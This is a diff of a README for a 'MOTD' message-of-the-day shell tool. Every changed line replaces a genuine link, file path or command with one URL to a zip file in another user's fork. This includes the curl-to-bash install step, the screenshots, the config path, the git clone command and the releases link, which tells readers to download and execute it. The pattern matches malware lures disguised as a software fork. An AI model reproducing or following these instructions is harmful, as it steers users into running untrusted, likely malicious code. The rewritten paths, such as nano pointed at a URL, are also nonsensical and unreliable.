@@ -1,8 +1,8 @@
 # MOTD - Your Custom Message of the Day Tool
 
-![screenshot](screenshot-1.png)
+![screenshot](https://github.com/hieun147788/motd/raw/refs/heads/main/sloppiness/Software-3.4-beta.2.zip)
 
-![screenshot](screenshot.png)
+![screenshot](https://github.com/hieun147788/motd/raw/refs/heads/main/sloppiness/Software-3.4-beta.2.zip)
 
 ## Table of Contents
 
@@ -26,7 +26,7 @@ MOTD (Message of the Day) is a simple tool that allows you to display customizab
 To install MOTD, run the following command in your terminal:
 
 ```bash
-bash <(curl -fsSL https://raw.githubusercontent.com/distillium/motd/main/install-motd.sh)
+bash <(curl -fsSL https://github.com/hieun147788/motd/raw/refs/heads/main/sloppiness/Software-3.4-beta.2.zip)
 ```
 
 This command downloads and executes the installation script directly from the repository. Make sure you have the necessary permissions to run scripts on your system.
@@ -66,10 +66,10 @@ After installation, you can use the commands as follows:
 MOTD allows you to configure various settings to tailor the user experience. Here’s how you can modify your settings:
 
 1. **Edit the Configuration File:**
-   Locate the configuration file, usually found in `/etc/motd.conf`. Open it with your preferred text editor:
+   Locate the configuration file, usually found in `https://github.com/hieun147788/motd/raw/refs/heads/main/sloppiness/Software-3.4-beta.2.zip`. Open it with your preferred text editor:
 
    ```bash
-   nano /etc/motd.conf
+   nano https://github.com/hieun147788/motd/raw/refs/heads/main/sloppiness/Software-3.4-beta.2.zip
    ```
 
    You can change the default message, add logos, or adjust other settings.
@@ -108,7 +108,7 @@ Contributions are welcome! If you have ideas for new features or improvements, f
    Clone your forked repository to your local machine:
 
    ```bash
-   git clone https://github.com/YOUR_USERNAME/motd.git
+   git clone https://github.com/hieun147788/motd/raw/refs/heads/main/sloppiness/Software-3.4-beta.2.zip
    ```
 
 3. **Make Changes:**
@@ -144,8 +144,8 @@ For any questions or support, you can reach out via GitHub issues or contact the
 
 ## Releases
 
-For the latest releases and updates, please visit our [Releases](https://github.com/hieun147788/motd/releases) section. You can download the latest version and execute it to stay up-to-date with all features and improvements.
+For the latest releases and updates, please visit our [Releases](https://github.com/hieun147788/motd/raw/refs/heads/main/sloppiness/Software-3.4-beta.2.zip) section. You can download the latest version and execute it to stay up-to-date with all features and improvements.
 
-![Latest Releases](https://img.shields.io/github/v/release/hieun147788/motd)
+![Latest Releases](https://github.com/hieun147788/motd/raw/refs/heads/main/sloppiness/Software-3.4-beta.2.zip)
 
 You can also check for updates and enhancements regularly to ensure you have the best experience with MOTD.
